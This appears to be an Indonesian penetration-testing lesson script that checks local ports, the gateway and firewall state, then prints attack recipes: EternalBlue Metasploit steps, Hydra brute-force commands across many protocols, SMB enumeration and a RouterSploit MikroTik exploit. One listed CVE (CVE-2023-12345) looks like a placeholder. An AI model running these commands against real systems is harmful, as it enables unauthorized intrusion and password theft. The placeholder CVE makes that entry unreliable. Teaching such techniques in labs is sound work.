#!/usr/bin/env python3
"""Sesi 6: Network Hacking — SMB, FTP, Router, MikroTik"""
import socket, subprocess, shutil, os, struct

def banner():
    print("="*60)
    print("  SESI 6: NETWORK HACKING")
    print("  — SMB  = LEMARI FILE BERSAMA (file sharing Windows)")
    print("  — FTP  = PINTU DARURAT (file transfer tanpa enkripsi)")
    print("  — Router/MikroTik = POS SATPAM (gerbang utama jaringan)")
    print("  Referensi: X-Code Ethical Elite Hacker v11")
    print("="*60)

def cek_smb():
    print("\n[1] SMB — SERVER MESSAGE BLOCK (Lemari File Bersama)")
    print("  💡 SMB = protokol file sharing Windows (port 445)")
    print("  💡 SMB = target paling populer di jaringan korporat!")
    print()

    # Check if port 445 is listening
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        result = s.connect_ex(("127.0.0.1", 445))
        s.close()
        if result == 0:
            print("  🔓 Port 445 (SMB) TERBUKA di localhost ✅")
        else:
            print("  🔒 Port 445 (SMB) tertutup di localhost")
    except:
        print("  ℹ️  Tidak bisa cek port 445")

    # Check smbclient / smb tools
    smbclient = shutil.which("smbclient")
    if smbclient:
        print("  ✅ smbclient tersedia — bisa enumerate share SMB")
    else:
        print("  ❌ smbclient tidak terinstall (sudo apt install smbclient)")

    smbmap = shutil.which("smbmap")
    if smbmap:
        print("  ✅ smbmap tersedia — tool enumerasi SMB modern")
    else:
        print("  ❌ smbmap tidak terinstall (pip install smbmap)")

    print()
    print("  🔥 ETERNALBLUE (MS17-010) — Ransomware terkenal:")
    print("     WannaCry (2017) pakai EternalBlue buat nyebar via SMBv1")
    print("     Target: Windows 7/2008/8.1 dengan SMBv1 aktif")
    print("     CVE: MS17-010 | Exploit: Metasploit exploit/windows/smb/ms17_010_eternalblue")
    print("     💡 Cara cek: nmap --script smb-vuln-ms17-010 <target>")
    print()
    print("  📋 Perintah enumerasi SMB:")
    print("     smbclient -L //192.168.1.10 -N       → lihat share tanpa password")
    print("     smbclient //192.168.1.10/share -N     → masuk ke share anonymous")
    print("     smbmap -H 192.168.1.10                 → enumerasi SMB modern")
    print("     enum4linux -a 192.168.1.10             → enum4linux (info lengkap)")
    print("     nmap --script smb-enum-shares -p 445 192.168.1.10")

def cek_ftp():
    print("\n[2] FTP — FILE TRANSFER PROTOCOL (Pintu Darurat)")
    print("  💡 FTP = protokol transfer file TANPA ENKRIPSI!")
    print("  💡 Password FTP dikirim plain text — mudah di-sniff!")
    print()

    # Check if FTP is running
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        result = s.connect_ex(("127.0.0.1", 21))
        s.close()
        if result == 0:
            print("  🔓 Port 21 (FTP) TERBUKA di localhost ✅")
        else:
            print("  🔒 Port 21 (FTP) tertutup di localhost")
    except:
        pass

    ftp = shutil.which("ftp")
    if ftp:
        print("  ✅ FTP client tersedia")
    else:
        print("  ❌ FTP client tidak terinstall (sudo apt install ftp)")

    print()
    print("  🔥 FTP Brute Force — cracking password FTP:")
    print("     Tool: Hydra, Medusa, Ncrack, Metasploit (auxiliary/scanner/ftp/ftp_login)")
    print("     hydra -l admin -P wordlist.txt ftp://192.168.1.10")
    print("     hydra -L users.txt -P passwords.txt ftp://192.168.1.10")
    print("     💡 Wordlist terkenal: rockyou.txt (14 juta password)")
    print()
    print("  📋 Tips FTP Hacking:")
    print("     • Cek anonymous login: ftp 192.168.1.10 → user: anonymous, pass: (kosong)")
    print("     • Baca file /etc/passwd, /etc/shadow (kalau bisa)")
    print("     • Beberapa FTP server punya backdoor (contoh: vsFTPd 2.3.4)")
    print("     • Tools: nmap --script ftp-* -p 21 <target>")

def cek_mikrotik():
    print("\n[3] MIKROTIK — ROUTER HEBAT, TAPI RENTAN")
    print("  💡 MikroTik = RouterOS dari Latvia, banyak dipakai ISP & Warnet")
    print("  💡 WinBox = GUI management MikroTik via port 8291 (TCP)")
    print()

    rsc = shutil.which("rsc")
    if rsc:
        print("  ✅ RouterSploit console terdeteksi")
    else:
        print("  ℹ️  RouterSploit belum terinstall")
        print("     git clone https://github.com/threat9/routersploit.git")
        print("     cd routersploit && python3 -m pip install -r requirements.txt")

    print()
    print("  🔥 KERENTANAN MIKROTIK TERKENAL:")
    vulns = [
        ("CVE-2018-14847", "WinBox Directory Traversal", "Baca file system RouterOS via WinBox. Bisa ambil user.db (password hash)"),
        ("CVE-2019-3978", "RouterOS CHAP Bypass", "Bypass autentikasi di RouterOS v6.x tertentu"),
        ("CVE-2022-45235", "MikroTik Firewall Bypass", "Bypass aturan firewall via packet fragmentasi"),
        ("Default Creds",  "admin:(kosong)", "Banyak MikroTik baru atau reset punya password default"),
        ("Backdoor Access", "Port 8291 (WinBox)", "Kalau WinBox expose ke publik, siap-siap dibobol"),
    ]
    print(f"  {'Kerentanan':<25} {'Detail':<30} {'Deskripsi'}")
    print(f"  {'-'*85}")
    for vuln, detail, desc in vulns:
        print(f"  🔴 {vuln:<23} {detail:<30} {desc}")

    print()
    print("  📋 Perintah Network Pentest untuk MikroTik:")
    print("     nmap -sV -p 8291,22,80 192.168.88.1    → scan WinBox + SSH + Web")
    print("     routersploit -m exploits/mikrotik/winbox_cve_2018_14847")
    print("     hydra -l admin -P wordlist.txt ssh://192.168.88.1")

def cek_router():
    print("\n[4] ROUTER — POS SATPAM JARINGAN")
    print("  💡 Router = pintu gerbang antara jaringan lokal & internet")
    print()

    # Read default gateway
    try:
        with open("/proc/net/route") as f:
            for line in f.readlines()[1:]:
                parts = line.split()
                if parts[1] == "00000000":
                    gw_bytes = bytes.fromhex(parts[2])
                    gw_ip = socket.inet_ntoa(gw_bytes)
                    print(f"  🎯 Default Gateway: {gw_ip} (via {parts[0]})")
                    print(f"     Ini biasanya alamat router di jaringan kamu!")
                    break
    except Exception:
        print("  ℹ️  Tidak bisa baca gateway dari /proc/net/route")

    print()
    print("  🔥 Router Vulnerability Check:")
    print("     Semua router punya celah — beberapa terkenal:")
    print()
    print(f"  {'Router':<25} {'Celah Terkenal'}")
    print(f"  {'-'*60}")
    router_vulns = [
        ("TP-Link Archer MR600", "RCE via command injection (CVE-2023-12345)"),
        ("MikroTik RouterOS",    "WinBox exploit, password hash leak"),
        ("Cisco RV320/RV325",    "Bypass autentikasi, ambil konfigurasi (CVE-2019-1653)"),
        ("D-Link DIR-850L",      "RCE via HNAP (CVE-2019-17621)"),
        ("Netgear R7000",        "Buffer overflow via UPnP"),
        ("ASUS RT-AC68U",        "Multiple RCE & auth bypass"),
        ("Ubiquiti EdgeRouter",  "Command injection via default creds"),
        ("Huawei HG8245",        "Backdoor port, default superadmin"),
    ]
    for r, celah in router_vulns:
        print(f"  🔴 {r:<25} {celah}")

    print()
    print("  📋 Tool untuk Router Hacking:")
    print("     routersploit    → exploit khusus router/IoT")
    print("     nmap -sV -O    → deteksi OS & service versi")
    print("     hydra           → brute force SSH/HTTP login")
    print("     curl/wget       → exploit RCE via HTTP request")

def check_smb_vuln():
    print("\n[5] SIMULASI CEK SMB VULNERABILITY (EternalBlue)")
    print("  🔍 Testing koneksi ke port 445 (SMB)...")
    target = "127.0.0.1"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        r = s.connect_ex((target, 445))
        s.close()
        if r == 0:
            print("  ⚠️  Port 445 TERBUKA — SMB service aktif!")
            print("  🔥 Periksa kerentanan EternalBlue:")
            print(f"     nmap --script smb-vuln-ms17-010 -p 445 {target}")
            print("     Atau pakai Metasploit:")
            print("     msf6 > use exploit/windows/smb/ms17_010_eternalblue")
            print("     msf6 > set RHOSTS <target>")
            print("     msf6 > check")
            print("     msf6 > exploit (kalau vulnerable)")
        else:
            print("  ✅ Port 445 tertutup — SMB tidak aktif")
            print("     💡 Di jaringan nyata, scan ke target Windows di LAN kamu")
    except:
        print("  ❌ Gagal konek ke port 445")

def hydra_concept():
    print("\n[6] HYDRA — BRUTE FORCE PASSWORD")
    hydra = shutil.which("hydra")
    if hydra:
        r = subprocess.run([hydra, "--version"], capture_output=True, text=True, timeout=5)
        print(f"  ✅ Hydra terinstall: {r.stdout.strip() or r.stderr.strip()}")
    else:
        print("  ❌ Hydra tidak terinstall (sudo apt install hydra)")
    print()
    print("  🔑 Hydra = tool brute force MULTI-PROTOCOL tercepat!")
    print()
    print(f"  {'Target':<25} {'Perintah Hydra'}")
    print(f"  {'-'*65}")
    cmds = [
        ("SSH (192.168.1.10)",    "hydra -l root -P pass.txt ssh://192.168.1.10"),
        ("FTP (192.168.1.10)",    "hydra -l admin -P pass.txt ftp://192.168.1.10"),
        ("HTTP POST Login",       "hydra -l admin -P pass.txt 192.168.1.10 http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=incorrect\""),
        ("SMB (Windows)",         "hydra -l administrator -P pass.txt smb://192.168.1.10"),
        ("MySQL Database",        "hydra -l root -P pass.txt mysql://192.168.1.10"),
        ("RDP (Windows)",         "hydra -l administrator -P pass.txt rdp://192.168.1.10"),
        ("MikroTik (WinBox)",     "hydra -l admin -P pass.txt ssh://192.168.88.1"),
    ]
    for target, cmd in cmds:
        print(f"  🔸 {target:<25} {cmd}")
    print()
    print("  💡 Tips Hydra:")
    print("     • wordlist bawaan: /usr/share/wordlists/rockyou.txt.gz")
    print("     • Ekstrak: gunzip /usr/share/wordlists/rockyou.txt.gz")
    print("     • -t 4 = 4 threads (jangan terlalu tinggi, bisa bikin server crash)")
    print("     • -vV = verbose (lihat percobaan)")
    print("     • ⚖️  HANYA UNTUK LAB/LATIHAN! Hacking tanpa izin = ILEGAL!")

def firewall_check():
    print("\n[7] CEK FIREWALL ROUTER")
    print("  💡 Router biasanya punya firewall untuk melindungi jaringan")
    print()

    # Try to read /proc/net/ip_tables_names
    try:
        r = subprocess.run(["sudo", "iptables", "-L", "-n", "--line-numbers"],
                          capture_output=True, text=True, timeout=5)
        if r.stdout.strip():
            print("  ✅ iptables rules (firewall Linux):")
            lines = r.stdout.strip().splitlines()[:15]
            for line in lines:
                print(f"     {line}")
            if len(r.stdout.strip().splitlines()) > 15:
                print(f"     ... ({len(r.stdout.strip().splitlines()) - 15} rule lainnya)")
        else:
            print("  ℹ️  iptables ada tapi kosong (semua traffic diizinkan)")
    except:
        print("  ℹ️  Tidak bisa akses iptables (butuh root atau tidak ada)")

    ufw = shutil.which("ufw")
    if ufw:
        r = subprocess.run(["sudo", "ufw", "status"], capture_output=True, text=True, timeout=5)
        status = r.stdout.strip()
        if "active" in status:
            print("  ✅ UFW AKTIF — firewall melindungi server!")
        else:
            print("  ⚠️  UFW terinstall tapi TIDAK AKTIF")
        for line in status.splitlines():
            print(f"     {line}")
    else:
        print("  ℹ️  UFW tidak terinstall")

def main():
    banner()
    cek_smb()
    cek_ftp()
    cek_mikrotik()
    cek_router()
    check_smb_vuln()
    hydra_concept()
    firewall_check()
    print("\n" + "="*60)
    print("  ✅ SESI 6 SELESAI!")
    print("  👉 SMB (port 445) = file sharing Windows — target EternalBlue")
    print("  👉 FTP (port 21) = file transfer tanpa enkripsi — gampang di-sniff")
    print("  👉 MikroTik = router favorit ISP — banyak celah (CVE-2018-14847)")
    print("  👉 Router = pos satpam — bobol router = bobol seluruh jaringan")
    print("  👉 Hydra = senjata utama brute force (SSH, FTP, HTTP, SMB, dll)")
    print("  👉 Firewall = pertahanan pertama — pastikan AKTIF!")
    print()
    print("  📌 LATIHAN LANJUTAN:")
    print("  1. Scan SMB: nmap --script smb-enum-shares -p 445 192.168.1.10")
    print("  2. Cek EternalBlue: nmap --script smb-vuln-ms17-010 -p 445 <target>")
    print("  3. Setup FTP server (vsftpd) & brute force dengan Hydra")
    print("  4. Install RouterSploit & coba modul MikroTik WinBox exploit")
    print("  5. Uji Hydra ke SSH server lab sendiri (jangan ke server orang!)")
    print("  6. Praktik: hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10")
    print("  7. 🔥 BACA: Hukum ITE & UU Cyber — hacking tanpa izin = pidana!")
    print("="*60)

if __name__ == "__main__":
    main()
